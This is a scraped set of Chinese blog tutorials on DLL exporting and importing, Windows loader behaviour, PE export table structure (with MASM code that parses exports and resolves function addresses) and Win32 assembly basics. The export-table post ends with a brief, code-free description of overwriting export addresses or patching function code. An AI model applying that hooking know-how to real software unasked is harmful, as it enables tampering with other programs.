为了使用VC++构建的DLL能被其他编译工具正常导入使用，必须告知MS编译器不要对导出函数进行改名。可以通过两种方法来达到这一幕的。 1）使用.def文件。 在.def文件下包含类似下面的EXPORTS字段 EXPORTS MyFunc 当MS的连接器解析这个.def文件的时候，会发现_MyFunc@8和MyFunc都被导出。由于两个函数名是匹配的，因此连接器会用.def文件定义的名称。 如果想要避免使用.def文件，可以使用第二种方法输出未阶段的函数版本，在DLL的源代码中，可以添加下面这行代码： 1#pragma comment(linker,&quot;/export:MyFunc=_MyFunc@8&quot;) 这会直接指示编译器产生一个连接器指示符，该指示符告诉连接器要导出一个名为MyFunc的函数，该函数入口和_MyFunc@8相同。 构建可执行模块123456789101112131415161718192021222324252627282930313233#define _CRT_SECURE_NO_WARNINGS/************************************************************************//* Module: MyExeFile1.cpp *//************************************************************************/ // Include the standard windows and C-Runtime header files here.#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;strsafe.h&gt;#include &lt;stdlib.h&gt; // Include the exported data structures, symbols, functions, and variables.#include &quot;MyLib.h&quot; ////////////////////////////////////////////////////////////////////////// int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ int nLeft = 10, nRight = 25; TCHAR sz[100]; StringCchPrintf(sz, _countof(sz), TEXT(&quot;%d + %d = %d&quot;), nLeft, nRight, Add(nLeft, nRight)); MessageBox(NULL, sz, TEXT(&quot;Calculation&quot;), MB_OK); StringCchPrintf(sz, _countof(sz), TEXT(&quot;The result from the last Add is : %d&quot;), g_nResult); MessageBox(NULL, sz, TEXT(&quot;Last Result&quot;), MB_OK); return 0;} 导入函数__declspec(dllimports)，当输入一个符号，不必使用关键，只需要使用标准的C关键字extern即可。 在导入符号的时候，不必使用__declspec(dllimport)关键字，可以直接使用标准C的extern关键字。 但是如果编译器能提前知道我们引用的符号是从DLL的.lib导入，那么能够产生略微高效的代码。有鉴于此，作者建议尽量在导入函数和数据符号的时候使用__declspec(dllimport)关键字。 连接器在解决导入符号的时候，会在生成的可执行模块嵌入一个导入段（import section）导入段列出了该模块所需的DLL模块，以及它从每个DLL模块中引用的符号。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107F:\\Code\\Kernel_Code\\DLL\\MyLib\\Mylib\\Mylib&gt;dumpbin -importsMicrosoft (R) COFF/PE Dumper Version 12.00.40629.0Copyright (C) Microsoft Corporation. All rights reserved. Dump of file SubProcess.exe File Type: EXECUTABLE IMAGE Section contains the following imports: MyLib.dll 41915C Import Address Table 419380 Import Name Table 0 time date stamp 0 Index of first forwarder reference 1 g_nResult 0 Add USER32.dll 419190 Import Address Table 4193B4 Import Name Table 0 time date stamp 0 Index of first forwarder reference 24D MessageBoxW MSVCR120D.dll 419090 Import Address Table 4192B4 Import Name Table 0 time date stamp 0 Index of first forwarder reference 26E _commode 282 _crt_debugger_hook 1CE __crtUnhandledException 1CD __crtTerminateProcess 137 ?terminate@@YAXXZ 2D6 _fmode 3CB _lock 53F _unlock 25B _calloc_dbg 1D0 __dllonexit 473 _onexit 34B _invoke_watson 272 _controlfp_s 2AD _except_handler4_common 7C6 wcscpy_s 5DD _wmakepath_s 5FF _wsplitpath_s 22E __winitenv 345 _initterm 346 _initterm_e 219 __setusermatherr 26F _configthreadlocale 25C _cexit 2B6 _exit 68F exit 16E _CrtSetCheckCount 15D _CrtDbgReportW 217 __set_app_type 22D __wgetmainargs 244 _amsg_exit 18D _XcptFilter 157 _CRT_RTC_INITW 56A _vsnwprintf 1CB __crtSetUnhandledExceptionFilter KERNEL32.dll 419000 Import Address Table 419224 Import Name Table 0 time date stamp 0 Index of first forwarder reference 267 GetModuleHandleW 263 GetModuleFileNameW 19E FreeLibrary 5A3 VirtualQuery 333 HeapFree 32F HeapAlloc FE DecodePointer 2D6 GetSystemTimeAsFileTime 20E GetCurrentThreadId 20A GetCurrentProcessId 42D QueryPerformanceCounter 36D IsProcessorFeaturePresent 5CD WideCharToMultiByte 3D1 MultiByteToWideChar 3A7 LoadLibraryExW 29D GetProcAddress 250 GetLastError 440 RaiseException 367 IsDebuggerPresent 121 EncodePointer 2A2 GetProcessHeap Summary 1000 .data 1000 .idata 3000 .rdata 1000 .reloc 1000 .rsrc 4000 .text 10000 .textbss 紧靠符号名左边的数字是符号的提示（ h i n t）值，它与讨论无关。每个符号行最左边的数字用于指明该符号在进程的地址空间中所在的内存地址。该内存地址只有在可执行模块相链接时才出现。在D u m p B i n的输出的结尾处，可以看到更多的链接信息。 运行可执行模块启动一个可执行模块的时候，操作系统的加载程序会先为进程创建虚拟地址空间，接着把可执行模块映射到进程的地址空间中。之后加载程序会检查可执行模块的导入段，试图对所需要的DLL进行定位并将它们映射到进程的地址空间中。 由于导入段只包含DLL名称，不包含DLL路径，加载程序必须在用户的磁盘上搜索。以下是搜索顺序： 1）包含可执行文件的目录 2）Windows的系统目录，该目录可以通过GetSystemDirectory得到。 3）16位的系统目录，即Windows目录中的System子目录 4）Windows目录，该目录可以通过GetWindowsDirectory得到 5）进程当前目录 6）PATH环境变量所列出的目录 为了防止载入伪造的系统DLL，所以搜索顺序优先是Windows系统目录。 如果加载程序无法找到所需的DLL模块，会提示一个找不到xxx.dll的提示框。 当加载程序将所有DLL模块都载入并映射到进程地址空间以后，开始修复所有导入符号的引用。为了完成这一个工作，它会再次查看每个模块的导入段。 对导入段中列出的每个符号，加载程序会检查对应DLL的导出段，看该符号是否存在。如果该符号不存在。加载程序会弹出错误提示。 如果该符号存在，加载程序会取得该符号的RVA并给它加上DLL模块被载入到的虚拟地址。接着加载程序会将这个虚拟地址保存到可执行模块的导入段中。 接着当代码引用一个导入符号的时候，会查看调用模块的导入段并得到被导入符号的地址。就能正常访问被导入的变量，函数或C++类成员函数。 动态链接就这样完成了。 注：由于加载模块需要加载所有DLL模块，并用所有导出符号的正确地址来修复每个导入模块的导入段，这需要相当长的时间。不过这只发生在程序加载过程中，并不影响程序的运行。 为了减少载入时间，可以堆自己的可执行模块和DLL模块进行基地址重定位和绑定。","link":"/2019/10/01/DLL%E5%9F%BA%E7%A1%80/"},{"title":"PE权威指南-PE导出表","text":"一般情况下，PE中的导出表存在于动态链接库文件里。导出表的作用就是将PE中存在的函数引出到外部，以便其他人可以使用这些函数，实现代码的重用。 导出表的作用代码重用机制提供了重用代码的动态链接库，它会向调用者说明库里的哪些函数是可以被别人使用，这些信息组成了导出表。 导出表位于动态链接库文件里，EXE中也可以有导出表；也不能认为所有的DLL中都有导出表。 Windows装载器再进行PE装载时，会将导入表中登记的所有DLL一并装入，然后根据DLL的导出表中对导入函数的描述修正导入表的IAT值。通过导出表，DLL文件向调用它的程序或者系统提供到处函数的名称、序号，以及入口地址等信息； 导出表的作用： 可以通过导出表分析不认识的动态链接库文件所提供的功能 向调用者提供输出函数指令再模块中的起始地址 分析动态链接库功能猜测导出表中输出的函数的名字来分析动态链接库的功能 获得到处函数地址对一个动态链接库里的到处的函数的调用，既可以通过函数名称来进行，也可以通过函数的导出表来进行。 Widows加载器将与进程相关的DLL加载到虚拟地址空间以后，会根据导入表中的登记于该动态链接库相关的由INT指向的名称或编号来遍历DLL所在虚拟地址空间，通过INIT（编号）或函数名来查询导入表结构，从而确定该函数再虚拟地址空间中的其实地址的AV，并将该AV覆盖导入表的IAT相关项。 在覆盖IAT的过程中，导出表起到了参考和指引的作用。 构造含导出表的PE文件使用一个DLL文件的步骤： 编写DLL文件的源代码 编写函数导出声明文件(扩展名.def) 使用特别参数编译链接生成最终的DLL文件 编写包含文件(扩展名.inc) DLL源代码编写DLL源代码和其他程序不同，在源代码内部必须定义DLL的入口函数。入口函数为DllEntry。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libMAX_XYSTEPS equ 50DELAY_VALUE equ 50 ; 动画效果使用的步长X_STEP_SIZE equ 10Y_STEP_SIZE equ 9X_START_SIZE equ 20Y_START_SIZE equ 10LMA_ALPHA equ 2LMA_COLORKEY equ 1WS_EX_LAYERED equ 80000h;数据段 .datadwCount dd ?Value dd ?Xsize dd ?Ysize dd ?sWth dd ?sHth dd ?Xplace dd ?Yplace dd ?counts dd ?pSLWA dd ?User32 db 'user32.dll',0SLWA db 'SetLayeredWindowAttributes',0;代码段 .code;------------------; DLL入口;------------------DllEntry proc _hInstance,_dwReason,_dwReserved mov eax,TRUE retDllEntry endp;-------------------------------; 私有函数;-------------------------------TopXY proc wDim:DWORD,sDim:DWORD shr sDim,1 shr wDim,1 mov eax,wDim sub sDim,eax mov eax,sDim retTopXY endp;-----------------------------------------------------------; 窗口抖动进入效果;-----------------------------------------------------------AnimateOpen proc hWin:DWORD LOCAL Rct:RECT invoke GetWindowRect,hWin,ADDR Rct mov Xsize,X_START_SIZE mov Ysize,Y_START_SIZE invoke GetSystemMetrics,SM_CXSCREEN mov sWth,eax invoke TopXY,Xsize,eax mov Xplace,eax invoke GetSystemMetrics,SM_CYSCREEN mov sHth,eax invoke TopXY,Ysize,eax mov Yplace,eax mov counts,MAX_XYSTEPSaniloop: invoke MoveWindow,hWin,Xplace,Yplace,Xsize,Ysize,FALSE invoke ShowWindow,hWin,SW_SHOWNA invoke Sleep,DELAY_VALUE invoke ShowWindow,hWin,SW_HIDE add Xsize,X_STEP_SIZE add Ysize,Y_STEP_SIZE invoke TopXY,Xsize,sWth mov Xplace,eax invoke TopXY,Ysize,sHth mov Yplace,eax dec counts jnz aniloop mov eax,Rct.left mov ecx,Rct.right sub ecx,eax mov Xsize,ecx mov eax,Rct.top mov ecx,Rct.bottom sub ecx,eax mov Ysize,ecx invoke TopXY,Xsize,sWth mov Xplace,eax invoke TopXY,Ysize,sHth mov Yplace,eax invoke MoveWindow,hWin,Xplace,Yplace,Xsize,Ysize,TRUE invoke ShowWindow,hWin,SW_SHOW ret AnimateOpen endp;-------------------------; 窗口抖动退出效果;-------------------------AnimateClose proc hWin:DWORD LOCAL Rct:RECT invoke ShowWindow,hWin,SW_HIDE invoke GetWindowRect,hWin,ADDR Rct mov eax,Rct.left mov ecx,Rct.right sub ecx,eax mov Xsize,ecx mov eax,Rct.top mov ecx,Rct.bottom sub ecx,eax mov Ysize,ecx invoke GetSystemMetrics,SM_CXSCREEN mov sWth,eax invoke TopXY,Xsize,eax mov Xplace,eax invoke GetSystemMetrics,SM_CYSCREEN mov sHth,eax invoke TopXY,Ysize,eax mov Yplace,eax mov counts,MAX_XYSTEPSaniloop: invoke MoveWindow,hWin,Xplace,Yplace,Xsize,Ysize,FALSE invoke ShowWindow,hWin,SW_SHOWNA invoke Sleep,DELAY_VALUE invoke ShowWindow,hWin,SW_HIDE sub Xsize,X_STEP_SIZE sub Ysize,Y_STEP_SIZE invoke TopXY,Xsize,sWth mov Xplace,eax invoke TopXY,Ysize,sHth mov Yplace,eax dec counts jnz aniloop ret AnimateClose endp;--------------------------------------------; 窗口淡入效果，仅运行在2000/XP以上操作系统;--------------------------------------------FadeInOpen proc hWin:DWORD invoke GetWindowLongA,hWin,GWL_EXSTYLE or eax,WS_EX_LAYERED invoke SetWindowLongA,hWin,GWL_EXSTYLE,eax invoke GetModuleHandleA,ADDR User32 invoke GetProcAddress,eax,ADDR SLWA mov pSLWA,eax push LMA_ALPHA push 0 push 0 push hWin call pSLWA mov Value,90 invoke ShowWindow,hWin,SW_SHOWNAdoloop: push LMA_COLORKEY + LMA_ALPHA push Value push Value push hWin call pSLWA invoke Sleep,DELAY_VALUE add Value,15 cmp Value,255 jne doloop push LMA_ALPHA push 255 push 0 push hWin call pSLWA ret FadeInOpen endp;--------------------------------------------; 窗口淡出效果，仅运行在2000/XP以上操作系统;--------------------------------------------FadeOutClose proc hWin:DWORD invoke GetWindowLongA,hWin,GWL_EXSTYLE or eax,WS_EX_LAYERED invoke SetWindowLongA,hWin,GWL_EXSTYLE,eax invoke GetModuleHandleA,ADDR User32 invoke GetProcAddress,eax,ADDR SLWA mov pSLWA,eax push LMA_ALPHA push 255 push 0 push hWin call pSLWA mov Value,255doloop: push LMA_COLORKEY + LMA_ALPHA push Value push Value push hWin call pSLWA invoke Sleep,DELAY_VALUE sub Value,15 cmp Value,0 jne doloop retFadeOutClose endp End DllEntry 编写def文件为了让系统识别出来哪些是私有函数，哪些是到处函数，还需要在源代码外另外附加一个文件，在文件中列出要到处的函数名字。这个文件就是.def文件。连接器会根据这个def文件的内容在导出表中假如由EXPORTS指定的函数名。 1234EXPORTS AnimateOpen AnimateClose FadeInOpen FadeOutClose 编译和链接12ml /c /coff winResult.asmlink /DLL /subsystem:windows /Def:winResult.def winResult.obj /DLL表示生成的最终文件是一个动态链接库，扩展名为DLL /Def表示在生成的链接库的导出表中，加入该参数指定的def文件中的函数 winResult.dll是动态链接文件，该文件可以共享给高级语言如VC++、Delphi等使用 winResult.lib是汇编语言环境下的库文件。使用winResult.lib的汇编程序必须使用该库文件和包含文件(.inc) 编写头文件包含文件的扩展名为“.inc”，该文件也称为头文件。包含了动态链接库中到处函数的声明 1234AnimateOpen proto :dwordAnimateClose proto :dwordFadeInOpen proto :dwordFadeOutClose proto :dword 有了动态链接库、相关的lib文件和投文件，就可以在任意程序中使用这个dll里的导出函数。 使用导出函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107 .386 .model flat,stdcall option casemap:noneinclude windows.incinclude gdi32.incincludelib gdi32.libinclude user32.incincludelib user32.libinclude kernel32.incincludelib kernel32.libinclude winResult.incincludelib winResult.lib;数据段 .data?hInstance dd ?hWinMain dd ?;常量定义 .constszClassName db 'MyClass',0szCaptionMain db '窗口特效演示',0szText db '你好，认识我吗？^_^',0;代码段 .code;------------------; 窗口消息处理子程序;------------------_ProcWinMain proc uses ebx edi esi,hWnd,uMsg,wParam,lParam local @stPs:PAINTSTRUCT local @stRect:RECT local @hDc mov eax,uMsg .if eax==WM_PAINT invoke BeginPaint,hWnd,addr @stPs mov @hDc,eax invoke GetClientRect,hWnd,addr @stRect invoke DrawText,@hDc,addr szText,-1,\\ addr @stRect,\\ DT_SINGLELINE or DT_CENTER or DT_VCENTER invoke EndPaint,hWnd,addr @stPs .elseif eax==WM_CLOSE ;关闭窗口 invoke FadeOutClose,hWinMain invoke DestroyWindow,hWinMain invoke PostQuitMessage,NULL .else invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif xor eax,eax ret_ProcWinMain endp;----------------------; 主窗口程序;----------------------_WinMain proc local @stWndClass:WNDCLASSEX local @stMsg:MSG invoke GetModuleHandle,NULL mov hInstance,eax invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass ;注册窗口类 invoke LoadCursor,0,IDC_ARROW mov @stWndClass.hCursor,eax push hInstance pop @stWndClass.hInstance mov @stWndClass.cbSize,sizeof WNDCLASSEX mov @stWndClass.style,CS_HREDRAW or CS_VREDRAW mov @stWndClass.lpfnWndProc,offset _ProcWinMain mov @stWndClass.hbrBackground,COLOR_WINDOW+1 mov @stWndClass.lpszClassName,offset szClassName invoke RegisterClassEx,addr @stWndClass ;建立并显示窗口 invoke CreateWindowEx,WS_EX_CLIENTEDGE,\\ offset szClassName,offset szCaptionMain,\\ WS_OVERLAPPEDWINDOW,\\ 100,100,600,400,\\ NULL,NULL,hInstance,NULL mov hWinMain,eax invoke FadeInOpen,hWinMain ;invoke ShowWindow,hWinMain,SW_SHOWNORMAL invoke UpdateWindow,hWinMain ;更新客户区，即发送WM_PAINT消息 ;消息循环 .while TRUE invoke GetMessage,addr @stMsg,NULL,0,0 .break .if eax==0 invoke TranslateMessage,addr @stMsg invoke DispatchMessage,addr @stMsg .endw ret_WinMain endpstart: call _WinMain invoke ExitProcess,NULL end start Windows下的两种PE文件格式： exe可执行文件 dll动态链接库 导出表数据结构 在PE文件里定位导出表 导出表的数据结构组织 导出表实例 导出表定位 蓝色部分为导出表数据目录项信息。利用以上字节码可以获得与导出表有关的两条信息： 导出表所在地址RAV = 0x00002140 导出表数据大小 0000008f PEinfo获取的该文件的节信息： 导出表数据所在文件的偏移地址为：0x00000940 导出目录 IMAGE_EXPORT_DIERCTORY导出数据的第一个结构是 IMAGE_EXPORT_DIERCTORY。详细定义如下： 123456789101112131415IMAGE_EXPORT_DIERCTORY struct{ Characteristics DOWRD ?; //0000h 标志，未用 TimeDateStamp DOWRD ?; //0004h 时间戳 MajorVersuin WORD ?; //0008h 未用 MinorVersion WORD ?; //000ah 未用 nName DWORD ?; //000ch 指向该导出表的文件名字符串 nBase DOWRD ?; //0010h 导出函数的起始序号 NumberOfFunctions DOWRD ? ; //0014h 所有的导出函数个数 NumberOfNanems DWORD ? ; //0018h 以函数名导出的函数个数 AddressOfFunctions DOWRD ? ; //001c 导出函数地址表RAV AddressOfNames DOWRD ? ; //0020 函数名称地址表RAV AddressOfnameOrdinals DOWRD ? ; //0024 函数序号地址表 }IMAGE_EXPORT_DIERCTORY ENDS nName该字段指向一个以”\\0”结尾的字符串，字符串记录了导出表所在的最初文件名 NumberOfFunctions该字段定义了文件中导出函数的总个数 NumberOfNanems在导出表中，有些函数是定义名字的，有些是没有定义名字的。该字段记录了所有定义名字函数的个数。如果为0，则表示所有的函数都没有自定义名字。NumberOfNanems和NumberOfFunctions的关系是前者小于后者 AddressOfFunctions指向了全部导入函数的地址的起始。从入口地址开始为双字数组，数组的个数由NumberOfFunctions决定。在内存中，我们可以通过函数编号定位某个函数的地址。 1234567mov eax,[esi].AddressOfFunctions ;esi指向导出表结构IMAGE_EXPORT_DIERCTORY的起始地址mov ebx,num ;假设ebx为函数标号sub ebx,[esi].nBaseadd eax,[num*4]mov eax,[eax] ;到这里就获取函数的虚拟地址RAV，加上模块实际装入地址 ;就是在虚拟地址空间里真实的地址AV nBase导出函数标号的起始值。DLL中的第一个导出函数并不是从0开始，某导出函数的编号等于从AddressOfFunctions开始的顺序号加上这个值。 如图，Fun1的函数编号为nBase + 0 = 200h，Fun2的函数编号为nBase + 1 = 201h. AddressOfnameOrdinals这个值是一个指针，与AddressOfNames是一一对应关系，所不同的是，AddressOfNames指向的是字符串的指针数组，而AddressOfnameOrdinals则指向了该函数在AddressOfFunctions中的索引值 索引值是一个字，而非双字。该值与函数编号是两个不同的改变，两者的关系为：索引值 = 编号 - nBase 导出表实例分析12345678900000940: 00 00 00 00 83 7a 77 5d 00 00 00 00 90 21 00 00 |.....zw].....!..|00000950: 01 00 00 00 04 00 00 00 04 00 00 00 68 21 00 00 |............h!..|00000960: 78 21 00 00 88 21 00 00 83 11 00 00 22 10 00 00 |x!...!......&quot;...|00000970: 82 12 00 00 23 13 00 00 9e 21 00 00 ab 21 00 00 |....#....!...!..|00000980: b7 21 00 00 c2 21 00 00 00 00 01 00 02 00 03 00 |.!...!..........|00000990: 77 69 6e 52 65 73 75 6c 74 2e 64 6c 6c 00 41 6e |winResult.dll.An|000009a0: 69 6d 61 74 65 43 6c 6f 73 65 00 41 6e 69 6d 61 |imateClose.Anima|000009b0: 74 65 4f 70 65 6e 00 46 61 64 65 49 6e 4f 70 65 |teOpen.FadeInOpe|000009c0: 6e 00 46 61 64 65 4f 75 74 43 6c 6f 73 65 00 00 |n.FadeOutClose..| 90 21 00 00 对应.name字段，指向文件偏移0x00000990。该处的值为字符串”winResutl.dll”，是动态链接库的最初的名字 01 00 00 00 对应.nBase字段，表示起始编号为1 04 00 00 00 对应.NumberOfFunctions，表示该段有4个导出函数 04 00 00 00 对应.NumberOfNanems字段，表示4个导出函数均为按名称导出 68 21 00 00 对应.AddressOfFunctions字段。从该位置取出连续4个地址(.NumberOfFunctions字段决定)，这些地址分别4个函数的RAV。 78 21 00 00 对应.AddressOfNames字段。从该位置取出的连续的4个地址依此为： 88 21 00 00 对应.AddressOfnameOrdinals字段。从该位置取出的连续4个单字索引依此为： 这些索引的值存在于.AddressOfFunctions所指向的函数地址列表中。最终4个函数的编号将分别是此处的索引值加上nBase的值，即0001、0002、0003、0004.函数名对应的索引值可以在调用了该动态链接库的程序.exe的导入表中查到 导出表编程根据标号查询函数地址通过标号查找函数地址，步骤是为： 定位到PE头 从PE文件头中找到数据目录表，表项的第一个双字值是导出表的起始RAV 从导出表的nBase字段得到起始序号 函数标号减去起始序号得到的是函数在AddressOfFunctions中的索引号 通过查询AddressOfFunctions指定索引位置的值，找到虚拟地址 将虚拟地址加上该动态链接库在被导入到地址空间后的基地址，即为函数的真实入口地址 根据名字查找函数地址 定位到PE头 从PE文件头中找到数据目录表，表项的第一个双字值是导出表的起始RAV 从导出表中获取NumberOfNanems字段的值，以便构造一个循环，根据此值确定循环的次数 从AddressOfNames字段指向的函数名称数组的第一项开始，于给定的函数名字进行匹配；如果匹配成功，则记录从AddressOfNames开始的索引号 通过索引号再去检索AddressOfNameOrdinals数组，从同样索引的位置找到函数的地址索引 通过查询AddressOfFunctions指定函数地址索引位置的值，找到虚拟地址 将虚拟地址加上该动态链接库在被导入到地址空间的基地址，即为函数的真实入口地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768_getApi proc _hModule,_lpApi local @ret local @dwLen pushad mov @ret,0 ;计算API字符串的长度，含最后的零 mov edi,_lpApi mov ecx,-1 xor al,al cld repnz scasb mov ecx,edi sub ecx,_lpApi mov @dwLen,ecx ;从pe文件头的数据目录获取导出表地址 mov esi,_hModule add esi,[esi+3ch] assume esi:ptr IMAGE_NT_HEADERS mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress add esi,_hModule assume esi:ptr IMAGE_EXPORT_DIRECTORY ;查找符合名称的导出函数名 mov ebx,[esi].AddressOfNames add ebx,_hModule xor edx,edx .repeat push esi mov edi,[ebx] add edi,_hModule mov esi,_lpApi mov ecx,@dwLen repz cmpsb .if ZERO? pop esi jmp @F .endif pop esi add ebx,4 inc edx .until edx&gt;=[esi].NumberOfNames jmp _ret@@: ;通过API名称索引获取序号索引再获取地址索引 sub ebx,[esi].AddressOfNames sub ebx,_hModule shr ebx,1 add ebx,[esi].AddressOfNameOrdinals add ebx,_hModule movzx eax,word ptr [ebx] shl eax,2 add eax,[esi].AddressOfFunctions add eax,_hModule ;从地址表得到导出函数的地址 mov eax,[eax] add eax,_hModule mov @ret,eax_ret: assume esi:nothing popad mov eax,@ret ret_getApi endp 遍历导出表123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475_getExportInfo proc _lpFile,_lpPeHead,_dwSize local @szBuffer[1024]:byte local @szSectionName[16]:byte local @lpAddressOfNames,@dwIndex,@lpAddressOfNameOrdinals pushad mov esi,_lpPeHead assume esi:ptr IMAGE_NT_HEADERS mov eax,[esi].OptionalHeader.DataDirectory[0].VirtualAddress .if !eax invoke _appendInfo,addr szErrNoExport jmp _Ret .endif invoke _RVAToOffset,_lpFile,eax add eax,_lpFile mov edi,eax ;计算导出表所在文件偏移位置 assume edi:ptr IMAGE_EXPORT_DIRECTORY invoke _RVAToOffset,_lpFile,[edi].nName add eax,_lpFile mov ecx,eax invoke _getRVASectionName,_lpFile,[edi].nName invoke wsprintf,addr @szBuffer,addr szMsgExport,\\ eax,ecx,[edi].nBase,[edi].NumberOfFunctions,\\ [edi].NumberOfNames,[edi].AddressOfFunctions,\\ [edi].AddressOfNames,[edi].AddressOfNameOrdinals invoke _appendInfo,addr @szBuffer invoke _RVAToOffset,_lpFile,[edi].AddressOfNames add eax,_lpFile mov @lpAddressOfNames,eax invoke _RVAToOffset,_lpFile,[edi].AddressOfNameOrdinals add eax,_lpFile mov @lpAddressOfNameOrdinals,eax invoke _RVAToOffset,_lpFile,[edi].AddressOfFunctions add eax,_lpFile mov esi,eax ;函数的地址表 mov ecx,[edi].NumberOfFunctions mov @dwIndex,0@@: pushad mov eax,@dwIndex push edi mov ecx,[edi].NumberOfNames cld mov edi,@lpAddressOfNameOrdinals repnz scasw .if ZERO? ;找到函数名称 sub edi,@lpAddressOfNameOrdinals sub edi,2 shl edi,1 add edi,@lpAddressOfNames invoke _RVAToOffset,_lpFile,dword ptr [edi] add eax,_lpFile .else mov eax,offset szExportByOrd .endif pop edi ;序号在ecx中 mov ecx,@dwIndex add ecx,[edi].nBase invoke wsprintf,addr @szBuffer,addr szMsg4,\\ ecx,dword ptr [esi],eax invoke _appendInfo,addr @szBuffer popad add esi,4 inc @dwIndex loop @B_Ret: assume esi:nothing assume edi:nothing popad ret_getExportInfo endp 导出表的应用导出函数的覆盖技术： 修改导出函数结构中的函数地址 覆盖函数地址部分的指令代码 修改导出结构中的函数地址修改前 修改后 需要注意的是：在使用导出函数地址覆盖技术的时候，首先要保证所涉及的两个函数参数入口一致，否则调用完成后栈不平衡，这回导致应用程序调用失败。 覆盖函数地址部分的指令代码AddressOfFuntions指向的地址空间指令字节码实施覆盖。 暴力覆盖：即使所有的代码全部替换为新代码。新代码可能含有原来代码的全部功能，也可能不包含原有代码功能 完美覆盖：通过构造指令，实施新代码于代码的共存和无遗漏运行 导出私有函数","link":"/2019/09/09/PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PE%E5%AF%BC%E5%87%BA%E8%A1%A8/"},{"title":"Windows-Assembly-3","text":"从”Hello，World”开始！ Win32汇编程序结构首先看看C语言实现”Hello，World”： 123456#include &lt;stdio.h&gt;int main(void){ printf(&quot;Hello,World&quot;); return 0;} 在c语言比重，我们不必为堆栈段、数据段核代码段的定义而担心，因为编译器会将程序中的字符串核代码语言存放到它们应该去的地方，程序开始的时候会找到main()函数。 在汇编中，我们需要自己去定义每个数据存放的段。 1234567891011121314151617181920212223;堆栈段stack segment stack db 100 dup (?)stack ends;数据段data segment szHello db 'Hello,World'data ends;代码段code segment assume cs:code,ds:code,ss:stackstart: mov ax,data mov ds,ax mov ah,9 mov dx,offset szHello int 21h mov ah,4ch int 21hcode endsend start 我们首先自己写一个Win32版本的Hello程序： 12345678910111213141516171819202122 .386 .model flat,stdcall option casemap:none;文件定义include windows.incinclude user32.incinclude kernel32.incincludelib kernel32.libincludelib user32.lib;数据段 .dataszCaption db 'First Elastic frame',0szText db 'Hello,World', 0;代码段 .codestart: invoke MessageBoxA,NULL,offset szText,offset szCaption,0 invoke ExitProcess,NULL end start 模式定义.386是汇编语言的伪指令，它在低版本的宏汇编就已经存在，类似的指令还有.8086，.186，.386等，用于告诉编译器在编译本程序中使用的指令集。在DOS程序默认使用8086指令集 .model语句.model语句是用来定义程序工作的模式，它的使用方法如下： 1.model 内存模式[语言模式][其他模式] 内存模式的定义可以直接影响生成的可执行文件，可执行文件的大小从小到大，可以分为很多种，在DOS的可执行程序中，有只用到 64KB的.com文件。到了Win32的情况下，又有了4GB内存的PE格式的可执行文件，编写不同类型的可执行文件要用不同的.model语句定义不同的参数。 Windows的API调用使用的stdcall格式，四朋哟早Win32汇编中没有选项，必须在.model中加上stdcall传递参数的细节 option语句用option语句定义的选项有很多，在Win32汇编中必须定义这个选项，因为Win32API是对API区分大写。 段的定义把编写的Hello源代码中的语句归纳一下： 12345678910111213141516171819 .386 .model flat,stdcall option casemap:none&lt;Include语句&gt; .stack [堆栈段的大小] .data &lt;初始化后的数据&gt; .data? &lt;未初始化后的数据&gt; .const &lt;一些常量定义&gt; .code &lt;代码&gt; &lt;开始标号&gt; &lt;其他语句&gt; end &lt;开始标号&gt; .stack，.data，.data?，.const和.code是分段伪指令，Win32中实际只有代码和数据之分，由于Win32汇编不必考虑堆栈，系统会分配一个向下的、足够大的段作为堆栈段，所以.stack经常会被忽略定义 数据段.data，.data?和.const定义的是数据段，分别对应不同的数据定义方式，在最后也放在不同的节区中。程序中的数据定义一般可以归纳为三类。 第一类是可读可写的已定义变量。 第二类是可读可写的未定义变量 第三类是一些常量。 代码段.code段是代码段，所有的指令都必须写在代码段中，在可执行文件中，代码段一般是放在TEXT节区中。Win32环境中的数据段是不可执行的，只有代码段有可执行数据。堆与工作在环3层的应用来说，.code段是不可写的。 堆栈段在程序中不必定义堆栈段，系统会自动分配堆栈空间。唯一值得一提的是：堆栈段的内存属性是可读可写可执行的。 注释和换行汇编中的注释是以”;”开始，如果一行写不下的代码，可以加一个”&quot;。 12345invoke MessageBoxA \\ NULL ;父窗口句柄 offset szText ;消息窗口的文字 offset szCapTion ;标题文字 MB_OK ;弹出方式 调用APIAPI是什么Win32程序是构筑在Win32 API上的。在Win32API中，包含了大量的函数、结构体和消息等，它们不仅被程序调用，也是自身的一部分。 应用程序在使用的时候是由Windows自助装入DLL程序并调用相应的函数 Kernel32.dll-系统服务功能。包括内存管理、任务管理和动态链接等。 GdI32.dll-图形设备接口。利用VGA等显示设备驱动程序完成显示 User32.dll-用户接口服务。建立窗口和传送消息等 调用APIWin32API是通过堆栈来传递参数的，调用者把参数一个个压入栈，DLL中的函数程序再从堆栈中取出参数处理，并在返回前将堆栈中无用的参数丢弃。 123456int MessageBox( HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); Win32环境中的实际参数只有一个类型，那就是一个32位的整数，所以这些参数都是dword类型，之所以可以定义成不同的模样，是为了说明其用途。 在汇编中调用MessageBox函数的方法是： 12345push uTypepush lpCaptionpush lpTextpush hWndcall MessageBox 源程序编译链接称为可执行文件后，call MessageBox语句中的MessageBox会被替换成一个地址，指向可执行文件中的导入表。 invokeinvoke伪指令，它的格式是： 1invoke 函数名[,参数1][,参数2]..... 